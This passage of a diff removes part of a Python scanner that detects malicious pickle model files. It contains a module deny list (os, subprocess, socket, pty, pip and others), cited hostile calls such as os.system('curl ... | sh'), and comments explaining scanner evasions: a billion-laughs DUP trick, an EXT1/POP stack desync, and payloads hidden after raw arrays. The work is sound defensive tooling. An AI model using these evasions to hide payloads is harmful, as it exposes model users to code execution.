-    result of a REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call (a real unpickle would
-    push whatever object that callable returned, which is unknowable
-    statically), a PERSID/EXT-registry lookup, or anything else outside the
-    literal-constant/container opcodes this walk understands. Keeping a
-    placeholder (rather than skipping the push) is what keeps the stack
-    depth simulation correct for later opcodes; being non-literal is what
-    correctly poisons any enclosing args tuple that embeds it, per the
-    "don't guess at values" requirement -- e.g. `Foo(SomeReduceResult())` is
-    reported as callable-only, not as a fabricated literal.
-    """
-    __slots__ = ()
-
-    def __repr__(self) -> str:
-        return "<PICKLE-OPAQUE>"
-
-
-class _PickleCallResultType:
-    """Sentinel for the return value of a REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ
-    call whose callable this walk *did* resolve to a `module.name`.
-
-    A narrower `_PICKLE_OPAQUE`: the value is equally unknowable, but its
-    *provenance* is not. Distinguishing "this argument is the object another
-    resolved call just built" from "this argument is a persistent-ID or
-    extension-registry lookup" is what makes call chaining observable, and the
-    two must stay distinguishable because real model pickles are full of the
-    latter -- every torch tensor is rebuilt from a PERSID storage -- and
-    contain none of the former.
-
-    Deliberately not a literal (`_is_pickle_literal` rejects it, as it rejects
-    `_PICKLE_OPAQUE`), so it still poisons an enclosing argument tuple rather
-    than being reported as a resolved value.
-    """
-    __slots__ = ("ref",)
-
-    def __init__(self, ref: str) -> None:
-        self.ref = ref
-
-    def __repr__(self) -> str:
-        return f"<PICKLE-RESULT-OF {self.ref}>"
-
-
-_PICKLE_MARK = _PickleMarkType()
-_PICKLE_OPAQUE = _PickleOpaqueType()
-
-
-class _PickleGlobalRef(str):
-    """A resolved GLOBAL/STACK_GLOBAL reference pushed on the simulated
-    stack. It *renders* as a string ('numpy.ndarray'), which is exactly the
-    problem: arg-text extraction was reading these as free-text arguments,
-    and any allowlisted callable handed a class reference (defaultdict(int),
-    _reconstruct(numpy.ndarray, ...), both constant in real models) then
-    tripped the "invoked with a string argument" check. A global reference
-    is an object, not text; this marker keeps the two apart without changing
-    how the ref resolves, prints, or compares."""
-    __slots__ = ()
-
-
-def _pop_to_mark(stack: list) -> list:
-    """Pop and return every value pushed since the most recent MARK, in
-    original push order, consuming the MARK itself.
-
-    Tolerates a missing MARK (truncated/malformed stream) by draining the
-    whole stack rather than raising -- this walks attacker-controlled bytes,
-    so a deliberately corrupted opcode sequence must degrade to "resolved
-    nothing further," never crash the scan.
-    """
-    items: list = []
-    while stack:
-        value = stack.pop()
-        if value is _PICKLE_MARK:
-            break
-        items.append(value)
-    items.reverse()
-    return items
-
-
-def _is_pickle_literal(value: Any, _seen: set[int] | None = None) -> bool:
-    """True if value is built entirely from pickle-VM literal constants
-    (str, bytes, int, float, bool, None, or a tuple/list composed entirely of
-    literals) -- the set of values this module is willing to print verbatim
-    as resolved call-argument evidence. Returns False for `_PICKLE_OPAQUE`
-    and any other unresolved/opaque stack value, which is what keeps a
-    dynamic or chained-call argument (e.g. built from another REDUCE's
-    return value) from being misreported as a concrete literal.
-
-    Shared containers are visited once. The simulated stack is a DAG, not a
-    tree: the `DUP` opcode pushes a second reference to the same object, so
-    `DUP TUPLE2` doubles the node count a naive traversal would walk while
-    costing two bytes and adding one level of depth. Repeating it is the
-    pickle spelling of a billion-laughs attack -- ColdwaterQ ships exactly
-    this as `billionLaughs.pt` -- and it took this function from
-    milliseconds to 6.9 seconds on a **73-byte** file, doubling per extra
-    round. For a scanner that is an evasion rather than a slowdown: the scan
-    stalls or gets killed, and the file is never reported.
-
-    An identity set is the right bound rather than a node budget, because the
-    only way to present a genuinely large *tree* is to spend proportionally
-    many bytes on it, which `MAX_SCAN_BYTES` already caps. Note this is
-    memoized on identity, not equality -- two equal-but-distinct tuples are
-    still each checked.
-    """
-    if value is None or isinstance(value, (bool, int, float, str, bytes, bytearray)):
-        return True
-    if isinstance(value, (tuple, list)):
-        if _seen is None:
-            _seen = set()
-        marker = id(value)
-        if marker in _seen:
-            # Already validated (or currently being validated, i.e. a cycle):
-            # a container that only contains containers cannot make the whole
-            # value non-literal on its own.
-            return True
-        _seen.add(marker)
-        return all(_is_pickle_literal(v, _seen) for v in value)
-    return False
-
-
-# Bounded renderer for resolved call arguments. Plain `repr()` walks a shared
-# structure once per path, so the `DUP`-built DAG described in
-# `_is_pickle_literal` renders as a 218MB string from a 73-byte file (4.7s,
-# doubling per extra round) -- which then gets embedded in a finding message,
-# serialized into JSON/SARIF and printed. Memoizing the *analysis* walks was
-# not enough on its own; the display path needed its own bound.
-#
-# Only presentation is capped. Detection still reads the real values, so a
-# truncated render never changes a verdict.
-_PICKLE_ARG_REPR = reprlib.Repr()
-_PICKLE_ARG_REPR.maxlevel = 6
-_PICKLE_ARG_REPR.maxtuple = 8
-_PICKLE_ARG_REPR.maxlist = 8
-_PICKLE_ARG_REPR.maxset = 8
-_PICKLE_ARG_REPR.maxfrozenset = 8
-_PICKLE_ARG_REPR.maxdict = 8
-_PICKLE_ARG_REPR.maxstring = 256
-_PICKLE_ARG_REPR.maxother = 256
-_PICKLE_ARG_REPR.maxlong = 64
-
-# Cap on literal texts kept from a partially-resolved call. A handful is
-# plenty of evidence; the bound exists because argument lists are
-# attacker-sized.
-_PICKLE_MAX_PARTIAL_TEXTS = 8
-
-
-@dataclass(frozen=True)
-class PickleResolvedCall:
-    """A REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose callable resolved
-    to a known `module.name` global AND whose argument(s) resolved entirely
-    to literal constants already on the simulated stack -- e.g. the concrete
-    `('curl ... | sh',)` actually passed to `os.system`, not merely the fact
-    that `os.system` is referenced somewhere in the stream. This is the
-    fickling-style argument-level evidence layered on top of the existing
-    global-reference walk.
-    """
-    ref: str
-    args: tuple[Any, ...]
-    kwargs: dict[str, Any] | None = None
-    # Literal text arguments recovered from a call whose argument list did
-    # *not* fully resolve, because at least one sibling argument was opaque.
-    #
-    # Requiring every argument to be literal before recording anything is the
-    # right rule for `args` -- it is what keeps a fabricated value out of a
-    # finding -- but applied to the whole call site it threw away real
-    # evidence. The canonical dynamic-resolution chain is
-    # `getattr(globals(), "eval")`: `globals()` is a REDUCE result and so
-    # opaque, which discarded the `"eval"` literal that is the entire point of
-    # the chain. Slaviero documented that shape in 2011 and it landed at INFO
-    # here (tracked as DEF-45).
-    #
-    # These are strings that genuinely appeared in an argument position, never
-    # a guess at an unresolved value, and `format()` renders them with
-    # ellipses so a partially-resolved call can never be misread as a complete
-    # one. Non-empty only when the call did not fully resolve, so it doubles
-    # as the "is this partial" flag.
-    partial_texts: tuple[str, ...] = ()
-    # Refs of the resolved calls whose *return values* were passed into this
-    # one, i.e. the edges of the call graph the pickle builds. Empty for the
-    # overwhelmingly common shape where every argument is a literal, a
-    # persistent-ID storage or an extension-registry lookup.
-    chained_from: tuple[str, ...] = ()
-    # True if this call's own return value was later used as the *callable*
-    # operand of another call opcode -- the pickle invoked something it had
-    # just computed. See `_triage_unknown_pickle_call` for why that is the
-    # load-bearing half of the chain signal.
-    result_invoked: bool = False
-
-    def format(self) -> str:
-        """Render as a call-expression string, e.g. os.system('echo pwned').
-
-        Uses the bounded renderer above rather than plain `repr()`: these are
-        attacker-controlled structures, and an unbounded render is a memory
-        bomb (see `_PICKLE_ARG_REPR`).
-        """
-        if self.partial_texts:
-            shown = ", ".join(_PICKLE_ARG_REPR.repr(t) for t in self.partial_texts)
-            return f"{self.ref}(... {shown} ...)"
-        parts = [_PICKLE_ARG_REPR.repr(a) for a in self.args]
-        if self.kwargs:
-            parts.extend(f"{k}={_PICKLE_ARG_REPR.repr(v)}" for k, v in self.kwargs.items())
-        return f"{self.ref}({', '.join(parts)})"
-
-
-# A protocol-2-or-later pickle opens with PROTO and its version byte. That
-# two-byte marker is what a resync looks for: it is specific enough not to
-# match often in tensor data, and every payload worth finding after a raw
-# array uses one.
-_PICKLE_RESYNC_MARKERS: tuple[bytes, ...] = tuple(
-    b"\x80" + bytes([proto]) for proto in range(2, 6)
-)
-
-# Bounded so a file of near-misses cannot turn the walk quadratic. Real
-# joblib files interleave a handful of arrays, not hundreds.
-_MAX_PICKLE_RESYNCS = 16
-
-
-def _next_pickle_offset(data: bytes, at: int) -> int | None:
-    """Where the next pickle plausibly starts, at or after `at`."""
-    best: int | None = None
-    for marker in _PICKLE_RESYNC_MARKERS:
-        found = data.find(marker, at)
-        if found != -1 and (best is None or found < best):
-            best = found
-    return best
-
-
-def _pickle_stream_truncated(data: bytes) -> bool:
-    """True when `data` runs out in the middle of a pickle stream.
-
-    A pickle ends at its STOP opcode. Bytes that stop arriving before that one
-    is read are not a stream that was examined and found clean, they are a
-    stream nobody finished reading, and whatever sat past the cut was never
-    seen. That is the "Art of Hide and Seek" shape (arXiv 2508.19774) reached
-    without any craft at all: a partial download or a corrupt checkpoint puts
-    the payload past the end. It is also what makes scanning a remote
-    checkpoint through HTTP range requests safe, since a prefix can only be
-    trusted once every pickle in it has terminated.
-
-    Judged only on segments opening with a PROTO opcode, and only when the
-    parse consumed every remaining byte. Both conditions keep this quiet on
-    files that are whole:
-
-    - torch's legacy layout follows its four pickles with raw tensor storage.
-      Storage does not open with PROTO, so the walk ends at the boundary
-      instead of calling the tensors a truncated stream.
-    - joblib splices raw array bytes *into* its stream, so the parse dies with
-      bytes still to spare. That is unparseable content rather than a short
-      file, and it stays silent for the reasons `_scan_pickle` documents.
-    """
-    # One buffer, seeked between pickles, rather than a fresh slice each time:
-    # this walks attacker-sized files, and re-slicing the remainder per pickle
-    # turns a file of many small streams quadratic.
-    stream = io.BytesIO(data)
-    total = len(data)
-    pos = 0
-    while pos < total:
-        if data[pos:pos + 2] not in _PICKLE_RESYNC_MARKERS:
-            return False
-        stream.seek(pos)
-        end_of_pickle: int | None = None
-        # The exception is the signal here, not a failure to report: where the
-        # walk gave up is exactly what separates a short file from an
-        # unreadable one, and `stream` still holds that position.
-        with contextlib.suppress(Exception):
-            for op, _arg, offset in pickletools.genops(stream):
-                if op.name == "STOP" and offset is not None:
-                    end_of_pickle = offset + 1
-                    break
-        if end_of_pickle is None:
-            # No STOP. Truncated only if the parse ran off the end of the
-            # data; stopping short of it means an opcode it could not read,
-            # which is a different (and deliberately unreported) condition.
-            return stream.tell() >= total
-        pos = end_of_pickle
-    return False
-
-
-def _resolve_pickle_globals(
-    data: bytes,
-) -> tuple[list[str], list[PickleResolvedCall], PickleMemoProfile]:
-    """Resolve globals and calls across *every* pickle in `data`, not just the
-    first one.
-
-    A pickle stream ends at its STOP opcode, but several real model-file
-    formats concatenate multiple pickles in one file. torch's legacy (non-zip)
-    save format is the important one: it writes a magic number, a protocol
-    version, a sys_info dict and only *then* the actual state_dict, as four
-    separate pickles, followed by raw storage bytes. Walking only as far as
-    the first STOP therefore examined a 14-byte magic-number pickle and
-    declared the file clean -- `os.system('...')` sitting in pickle #4 of a
-    2.5MB checkpoint produced zero findings, defeating the deny list, the
-    unknown-bucket re-triage and every other check in this module at once.
-
-    So: walk pickle after pickle until the stream is exhausted or stops
-    parsing. Trailing non-pickle data (the legacy format's raw tensor
-    storage) makes `genops` raise, which ends the walk normally and keeps
-    everything resolved so far. A failure on the *first* pickle still
-    propagates, preserving the "unparseable stream" fallback in `_scan_pickle`
-    that callers depend on.
-
-    Each pickle gets a fresh stack/memo, matching how a real ``Unpickler``
-    treats consecutive `load()` calls; `globals_found` and `resolved_calls`
-    accumulate across all of them.
-
-    The returned `PickleMemoProfile` is deliberately **not** accumulated. Memo
-    indices are judged one pickle at a time, because a real ``Unpickler``
-    starts every `load()` with an empty memo, so "one unbroken run" is a
-    property of a single pickle and says nothing about a concatenation of
-    them. Unioning the index sets would also raise the denominator every check
-    is measured against: a torch legacy file's 14-byte magic-number pickle
-    would be judged against the ~800 slots of the state_dict three pickles
-    later, so a splice into the small pickle would get roughly 800x the
-    headroom it should. Per-pickle judging is both what the VM does and the
-    more sensitive of the two.
-
-    What is returned is the first per-pickle profile that had out-of-band
-    indices, or (when none did) the profile of whichever pickle used the most
-    memo slots, so the caller sees the file's real memo shape either way.
-    """
-    globals_found: list[str] = []
-    resolved_calls: list[PickleResolvedCall] = []
-    profiles: list[PickleMemoProfile] = []
-
-    stream = io.BytesIO(data)
-    total = len(data)
-    is_first = True
-    resyncs = 0
-    while stream.tell() < total:
-        start = stream.tell()
-        calls_before = len(resolved_calls)
-        memo_indices: set[int] = set()
-        stopped = False
-        try:
-            _walk_one_pickle(stream, globals_found, resolved_calls, memo_indices)
-        except Exception:
-            if is_first and not globals_found and not resolved_calls:
-                # Nothing resolved at all -- preserve the documented contract
-                # that a wholly unparseable stream raises to the caller, so
-                # `_scan_pickle` still falls back to its raw-byte signature
-                # scan.
-                raise
-            # Something was resolved before the stream stopped parsing. Keep
-            # it: partial opcode evidence beats the substring fallback, which
-            # is the whole reason this walk exists.
-            #
-            # Two real formats land here. torch's legacy layout follows its
-            # pickles with raw tensor storage, which simply ends the walk.
-            # joblib is the harder one: it interleaves raw array bytes *into*
-            # the stream, so the very first pickle dies partway through -- at
-            # byte 911 of 183761 in a stock `sklearn-iris` model, after having
-            # already resolved five globals. Re-raising there threw those five
-            # away and left real sklearn models analyzed by substring match
-            # alone.
-            stopped = True
-        # Profiled even when this pickle stopped parsing partway: joblib
-        # streams always do, and the indices read before the stop are as real
-        # as any others.
-        profiles.append(_profile_memo_indices(memo_indices))
-        # Chain marking likewise stops at the pickle boundary: stack and memo
-        # reset at STOP, so a chain cannot span two pickles.
-        _propagate_result_invoked(resolved_calls, calls_before)
-        if stopped:
-            # The walk died inside raw data spliced into the stream. joblib
-            # does this by design, and a payload placed *after* the arrays was
-            # therefore never read: ModelAudit finds one that this walk missed
-            # (quickset case joblib-payload-after-raw-array). Skip forward to
-            # the next PROTO marker and keep going rather than giving up on
-            # the rest of the file.
-            if resyncs >= _MAX_PICKLE_RESYNCS:
-                break
-            resume = _next_pickle_offset(data, max(stream.tell(), start + 1))
-            if resume is None:
-                break
-            resyncs += 1
-            stream.seek(resume)
-            is_first = False
-            continue
-        if stream.tell() <= start:
-            # Defensive: a zero-length advance would spin forever on a
-            # malformed stream, and this walks attacker-controlled bytes.
-            break
-        is_first = False
-
-    flagged = [p for p in profiles if p.out_of_band]
-    if flagged:
-        memo_profile = flagged[0]
-    elif profiles:
-        memo_profile = max(profiles, key=lambda p: p.slots)
-    else:
-        memo_profile = _profile_memo_indices(set())
-
-    return globals_found, resolved_calls, memo_profile
-
-
-def _propagate_result_invoked(calls: list[PickleResolvedCall], start: int = 0) -> None:
-    """Backward fixpoint for result_invoked through intermediary calls.
-
-    The inline marking covers the direct shape (a computed value invoked
-    where it was produced). PickleCloak's exp_5/exp_28/exp_88 insert an
-    intermediary: `next(attr_chain(...))` is itself a call whose result is
-    invoked, so the invocation marks `next`, not `attr_chain`. One hop is
-    not the chain. Whenever a call is marked, the calls that produced its
-    arguments are one step closer to the invocation too, so marking
-    propagates backward through `chained_from` until nothing new is marked.
-    Runs per pickle (chains cannot cross a STOP: memo and stack reset), over
-    a handful of records, so the fixpoint is a few passes at most. `start`
-    is the first index of the current pickle's calls, not a slice: a slice
-    would copy the list and the marks would never land.
-    """
-    changed = True
-    while changed:
-        changed = False
-        for i in range(start, len(calls)):
-            call = calls[i]
-            if not call.result_invoked:
-                continue
-            for ref in call.chained_from:
-                for j in range(i - 1, start - 1, -1):
-                    if calls[j].ref == ref and not calls[j].result_invoked:
-                        calls[j] = dataclasses.replace(calls[j], result_invoked=True)
-                        changed = True
-                        break
-
-
-def _walk_one_pickle(
-    stream: io.BytesIO,
-    globals_found: list[str],
-    resolved_calls: list[PickleResolvedCall],
-    memo_indices: set[int],
-) -> None:
-    """Walk exactly one pickle from `stream`, appending what it resolves.
-
-    `memo_indices` collects every memo slot number this pickle stores into,
-    for the out-of-band index check. It is filled in place rather than
-    returned so the caller still has it after a stream that stops parsing
-    partway.
-
-    Consumes through that pickle's STOP opcode and leaves `stream` positioned
-    at the next byte, so the caller can walk any pickle that follows.
-
-    Resolves every GLOBAL/STACK_GLOBAL/INST/OBJ reference in the pickle
-    to a `module.name` string, and additionally resolves any
-    REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose arguments are literal
-    constants to a `PickleResolvedCall` (callable + concrete args) -- e.g.
-    resolving `os.system('curl ... | sh')` instead of just noting that
-    `os.system` was referenced somewhere in the stream.
-
-    Walks the opcode stream with a stack/memo simulation covering
-    string/int/float/bytes pushes, memo ops, container opcodes
-    (TUPLE*/LIST/DICT/SET* and their APPEND*/SETITEM*/ADDITEMS mutators),
-    MARK, and the call-construction opcodes (REDUCE/NEWOBJ/NEWOBJ_EX/INST/
-    OBJ/BUILD). Where a call's arguments can't be resolved to literals (e.g.
-    built from another REDUCE's return value), only the bare callable
-    reference is recorded, matching prior behavior -- this never guesses at
-    a value. Raises whatever pickletools.genops raises on an unparseable
-    stream -- callers should catch and fall back to a weaker signal.
-    """
-    import pickletools
-
-    # Fresh per pickle: a real Unpickler starts each load() with an empty
-    # stack and memo, so memo indices from an earlier pickle in the same file
-    # must not be visible here.
-    stack: list[Any] = []
-    memo: dict[int, Any] = {}
-    auto_memo_idx = 0
-
-    def _record_call(callable_val: Any, args: Any, kwargs: dict | None = None) -> None:
-        if isinstance(callable_val, _PickleCallResultType):
-            # The pickle is invoking a value it computed earlier in the same
-            # stream, rather than a global it named. Nothing about *this* call
-            # can be reported (the callable has no name to report), but the
-            # call that produced the callable is now known to have been
-            # invoked, which is what the chain signal keys on. Mark the most
-            # recent recording of that producer.
-            for i in range(len(resolved_calls) - 1, -1, -1):
-                if resolved_calls[i].ref == callable_val.ref:
-                    resolved_calls[i] = dataclasses.replace(
-                        resolved_calls[i], result_invoked=True
-                    )
-                    break
-            return
-        if not isinstance(callable_val, str):
-            return
-        if not isinstance(args, (tuple, list)):
-            return
-        args_tuple = tuple(args)
-        kwargs_literal = kwargs is None or _is_pickle_literal(tuple(kwargs.values()))
-        if _is_pickle_literal(args_tuple) and kwargs_literal:
-            resolved_calls.append(
-                PickleResolvedCall(callable_val, args_tuple, dict(kwargs) if kwargs else None)
-            )
-            return
-
-        # Partially resolved: at least one argument is opaque, so `args` would
-        # be a lie. Keep only the literal text that really is there. See
-        # PickleResolvedCall.partial_texts for why discarding it was wrong.
-        seen: list[str] = []
-        chained: list[str] = []
-        for value in _iter_pickle_arg_values((args_tuple, kwargs or {})):
-            if isinstance(value, _PickleCallResultType):
-                if value.ref not in chained and len(chained) < _PICKLE_MAX_PARTIAL_TEXTS:
-                    chained.append(value.ref)
-            elif (text := _pickle_arg_text(value)) is not None and text not in seen:
-                if len(seen) < _PICKLE_MAX_PARTIAL_TEXTS:
-                    seen.append(text)
-            # Both collections are capped for the same reason: argument lists
-            # are attacker-sized. Stop only once neither can grow.
-            if len(seen) >= _PICKLE_MAX_PARTIAL_TEXTS and len(chained) >= _PICKLE_MAX_PARTIAL_TEXTS:
-                break
-        if seen or chained:
-            # A call carrying no literal text still matters when it consumes a
-            # computed value: `next(attr_chain(...))` is the intermediary link
-            # in PickleCloak's resolver chains, and dropping it here broke the
-            # result-invoked marking the chain signal needs (the final call
-            # marks the most recent call with the callable's ref, which is
-            # this one).
-            resolved_calls.append(
-                PickleResolvedCall(callable_val, (), None, tuple(seen), tuple(chained))
-            )
-
-    for op, arg, _pos in pickletools.genops(stream):
-        name = op.name
-        if (
-            (name in _STRING_PUSH_OPCODES and isinstance(arg, str))
-            or (name in _INT_PUSH_OPCODES and isinstance(arg, int))
-            or (name in _FLOAT_PUSH_OPCODES and isinstance(arg, float))
-        ):
-            stack.append(arg)
-        elif name in _BYTES_PUSH_OPCODES and isinstance(arg, (bytes, bytearray)):
-            stack.append(bytes(arg))
-        elif name == "NONE":
-            stack.append(None)
-        elif name == "NEWTRUE":
-            stack.append(True)
-        elif name == "NEWFALSE":
-            stack.append(False)
-        elif name in _OPAQUE_PUSH_OPCODES:
-            # Opcodes that push a value this walk cannot know: a persistent-ID
-            # lookup (PERSID/BINPERSID), a copyreg extension-registry lookup
-            # (EXT1/EXT2/EXT4), or a protocol-5 out-of-band buffer
-            # (NEXT_BUFFER). The *value* is unknowable, but the push is not
-            # optional: skipping it desynchronizes the simulated stack against
-            # the real VM for every subsequent opcode.
-            #
-            # That desync was a 3-byte evasion of the argument-evidence
-            # re-triage. `EXT1` followed by `POP` leaves the real stack
-            # untouched (push then pop) while this walk, having pushed
-            # nothing, popped the *callable* instead -- so a
-            # `pip.main('http://...')` that still executes on load resolved to
-            # no call at all and fell from HIGH back to the suppressed INFO
-            # bucket. Denied globals were never affected (`globals_found` is
-            # recorded at GLOBAL time, independent of the stack), which is
-            # exactly why this hid only in the unknown bucket, where every
-            # bypass gadget already lives.
-            stack.append(_PICKLE_OPAQUE)
-        elif name == "BINPERSID":
-            # Pops the pid off the stack and pushes the resolved object.
-            if stack:
-                stack[-1] = _PICKLE_OPAQUE
-        elif name == "READONLY_BUFFER":
-            # Wraps the buffer on top of the stack; depth is unchanged, and
-            # the result is no more knowable than the input.
-            if stack:
-                stack[-1] = _PICKLE_OPAQUE
-        elif name == "MARK":
-            stack.append(_PICKLE_MARK)
-        elif name == "EMPTY_TUPLE":
-            stack.append(())
-        elif name == "EMPTY_LIST":
-            stack.append([])
-        elif name == "EMPTY_DICT":
-            stack.append({})
-        elif name == "EMPTY_SET":
-            stack.append(set())
-        elif name == "TUPLE1":
-            if stack:
-                stack[-1] = (stack[-1],)
-        elif name == "TUPLE2":
-            if len(stack) >= 2:
-                b, a = stack.pop(), stack.pop()
-                stack.append((a, b))
-        elif name == "TUPLE3":
-            if len(stack) >= 3:
-                c, b, a = stack.pop(), stack.pop(), stack.pop()
-                stack.append((a, b, c))
-        elif name == "TUPLE":
-            stack.append(tuple(_pop_to_mark(stack)))
-        elif name == "LIST":
-            stack.append(_pop_to_mark(stack))
-        elif name == "FROZENSET":
-            stack.append(frozenset(_pop_to_mark(stack)))
-        elif name == "APPEND":
-            if len(stack) >= 2:
-                value = stack.pop()
-                if isinstance(stack[-1], list):
-                    stack[-1].append(value)
-        elif name == "APPENDS":
-            items = _pop_to_mark(stack)
-            if stack and isinstance(stack[-1], list):
-                stack[-1].extend(items)
-        elif name == "ADDITEMS":
-            items = _pop_to_mark(stack)
-            if stack and isinstance(stack[-1], set):
-                stack[-1].update(items)
-        elif name == "DICT":
-            items = _pop_to_mark(stack)
-            stack.append({items[i]: items[i + 1] for i in range(0, len(items) - 1, 2)})
-        elif name == "SETITEM":
-            if len(stack) >= 3:
-                value, key = stack.pop(), stack.pop()
-                if isinstance(stack[-1], dict):
-                    with contextlib.suppress(TypeError):
-                        stack[-1][key] = value
-        elif name == "SETITEMS":
-            items = _pop_to_mark(stack)
-            if stack and isinstance(stack[-1], dict):
-                for i in range(0, len(items) - 1, 2):
-                    with contextlib.suppress(TypeError):
-                        stack[-1][items[i]] = items[i + 1]
-        elif name == "POP":
-            if stack:
-                stack.pop()
-        elif name == "POP_MARK":
-            _pop_to_mark(stack)
-        elif name == "DUP":
-            if stack:
-                stack.append(stack[-1])
-        elif name == "MEMOIZE":
-            if stack:
-                memo[auto_memo_idx] = stack[-1]
-            if len(memo_indices) < _MEMO_INDEX_MAX_TRACKED:
-                memo_indices.add(auto_memo_idx)
-            auto_memo_idx += 1
-        elif name in _MEMO_STORE_OPCODES:
-            if isinstance(arg, int):
-                # Recorded even when the stack is empty: an index written by a
-                # spliced block is evidence about the *writer* regardless of
-                # whether this walk can model what it stored there. Bounded,
-                # because that is otherwise a free memory amplification on
-                # attacker-controlled bytes (see _MEMO_INDEX_MAX_TRACKED).
-                if len(memo_indices) < _MEMO_INDEX_MAX_TRACKED:
-                    memo_indices.add(arg)
-                if stack:
-                    memo[arg] = stack[-1]
-        elif name in _MEMO_FETCH_OPCODES:
-            if isinstance(arg, int) and arg in memo:
-                stack.append(memo[arg])
-        elif name == "GLOBAL" and isinstance(arg, str):
-            # Protocol 0-2: arg is "module qualname" (space-separated).
-            parts = arg.split(" ", 1)
-            if len(parts) == 2:
-                ref = f"{parts[0]}.{parts[1]}"
-                globals_found.append(ref)
-                if (laundered := _laundered_denied_ref(parts[1])) is not None:
-                    globals_found.append(laundered)
-                stack.append(_PickleGlobalRef(ref))
-        elif name == "INST" and isinstance(arg, str):
-            # Protocol 0's old-style-class instantiation opcode. Resolves a
-            # callable through the identical find_class(module, name) path
-            # GLOBAL uses -- pickletools.genops hands back the same
-            # "module qualname" (space-separated) argument shape -- and then
-            # calls it directly with whatever args were pushed since the
-            # preceding MARK, without a separate REDUCE/BUILD opcode in
-            # between. Undetected, this is a full bypass of the GLOBAL/
-            # STACK_GLOBAL-only walk below. The mark-to-top values are the
-            # call's actual arguments (e.g. the shell command passed to
-            # os.system), so -- now that container/literal opcodes are
-            # simulated -- they're captured as resolved-call evidence too,
-            # not just consumed to keep the stack in sync.
-            call_args = tuple(_pop_to_mark(stack))
-            parts = arg.split(" ", 1)
-            if len(parts) == 2:
-                ref = f"{parts[0]}.{parts[1]}"
-                globals_found.append(ref)
-                if (laundered := _laundered_denied_ref(parts[1])) is not None:
-                    globals_found.append(laundered)
-                _record_call(ref, call_args)
-                # Real semantics push the newly constructed *instance*, not
-                # the class -- an opaque value, so a later opcode can't
-                # mistake it for a re-usable global reference or literal.
-                stack.append(_PickleCallResultType(ref))
-        elif name == "OBJ":
-            # Protocol 0's other old-style-instantiation opcode: like INST,
-            # but the class is the first item after MARK (already resolved
-            # to a ref string by an earlier GLOBAL) rather than encoded in
-            # OBJ's own argument.
-            items = _pop_to_mark(stack)
-            cls_ref = items[0] if items else None
-            if items:
-                _record_call(cls_ref, tuple(items[1:]))
-            stack.append(
-                _PickleCallResultType(cls_ref) if isinstance(cls_ref, str) else _PICKLE_OPAQUE
-            )
-        elif name == "STACK_GLOBAL":
-            # Protocol 4+: module and qualname were pushed as the two
-            # preceding string constants.
-            if len(stack) >= 2:
-                qualname = stack.pop()
-                module = stack.pop()
-                ref = f"{module}.{qualname}"
-                globals_found.append(ref)
-                if isinstance(module, str) and isinstance(qualname, str):
-                    if (laundered := _laundered_denied_ref(qualname)) is not None:
-                        globals_found.append(laundered)
-                stack.append(_PickleGlobalRef(ref))
-        elif name == "REDUCE":
-            if len(stack) >= 2:
-                raw_args = stack.pop()
-                callable_val = stack.pop()
-                _record_call(callable_val, raw_args)
-                stack.append(
-                    _PickleCallResultType(callable_val)
-                    if isinstance(callable_val, str) else _PICKLE_OPAQUE
-                )
-        elif name == "NEWOBJ":
-            # Protocol 2+'s construction opcode -- how most modern PyTorch
-            # pickles actually build tensors/objects (cls.__new__(cls, *args)).
-            if len(stack) >= 2:
-                raw_args = stack.pop()
-                cls_val = stack.pop()
-                _record_call(cls_val, raw_args)
-                stack.append(
-                    _PickleCallResultType(cls_val)
-                    if isinstance(cls_val, str) else _PICKLE_OPAQUE
-                )
-        elif name == "NEWOBJ_EX":
-            if len(stack) >= 3:
-                kwargs_val = stack.pop()
-                raw_args = stack.pop()
-                cls_val = stack.pop()
-                _record_call(
-                    cls_val,
-                    raw_args,
-                    kwargs_val if isinstance(kwargs_val, dict) else None,
-                )
-                stack.append(
-                    _PickleCallResultType(cls_val)
-                    if isinstance(cls_val, str) else _PICKLE_OPAQUE
-                )
-        elif name == "BUILD":
-            # obj.__setstate__(state) / obj.__dict__.update(state) mutates
-            # obj in place and returns nothing -- the state argument is
-            # popped, and obj (pushed by the preceding REDUCE/NEWOBJ/NEWOBJ_EX)
-            # is left on top of the stack unchanged. Needed purely to keep
-            # later opcodes from desyncing; BUILD itself doesn't call
-            # arbitrary code.
-            if stack:
-                stack.pop()
-
-
-# Modules where *any* member is denied, matched on the module prefix rather
-# than an exact `module.name`. Adopted from picklescan's `_unsafe_globals`
-# wildcard entries (MIT).
-#
-# This reverses an earlier judgement in this branch, and the reversal is worth
-# recording because the first call was made on reasoning and the second on
-# measurement. The original decision took picklescan's 57 explicit names and
-# skipped its 36 wildcards, on the grounds that a whole-module deny costs
-# precision -- citing its `uuid: *` entry, which reports an ordinary pickled
-# `uuid.UUID` as a dangerous import.
-#
-# Scored against picklescan's own 46-file corpus, that choice cost **9 of 35
-# detections**: `httplib.HTTPSConnection`, `aiohttp.client.ClientSession`,
-# `sys.exit`, `pickle.loads`, `_pickle.loads`, `bdb.Bdb`, `bdb.Bdb.run`,
-# `pip.main` and `pydoc.pipepager` all sit in wildcarded modules and all landed
-# in the unknown bucket. This scanner scored 54% there while scoring 100% on the
-# corpus written alongside it, which is what an author-written benchmark is
-# worth.
-#
-# The precision worry did not survive contact with data: across 12 real benign
-# models (torch zip, torch legacy, raw and zlib joblib, sklearn with custom
-# classes) **none** of the 36 modules occurs even once. picklescan ships these
-# wildcards inside HuggingFace's own scanning, so they run against far more
-# real-world models than any corpus here.
-#
-# `uuid` is the sole exclusion, because it is the one entry with a
-# demonstrated false positive: `uuid.UUID` is an ordinary pickled value.
-# Everything reachable in `uuid` that matters (its ctypes loading) is denied
-# through `ctypes` anyway.
-_PICKLE_DENIED_MODULES: frozenset[str] = frozenset({
-    "_aix_support", "_osx_support", "_pickle", "_pyrepl", "aiohttp", "asyncio",
-    "bdb", "cProfile", "commands", "ctypes", "distutils.file_util", "httplib",
-    "nt", "numpy.f2py", "numpy.testing._private.utils", "os", "pdb", "pickle",
-    "pip", "posix", "profile", "pty", "pydoc", "requests.api", "runpy",
-    "shutil", "socket", "ssl", "subprocess", "sys", "test", "timeit",
-    "urllib.request", "venv", "webbrowser",
-})
-
-
-def _is_denied_pickle_module(ref: str) -> bool:
-    """True if `ref` belongs to a wholly-denied module.
-
-    Matches on dotted-component boundaries so `pickle.loads` and
-    `urllib.request.urlopen` match while `pickletools.dis` and `ossaudiodev`
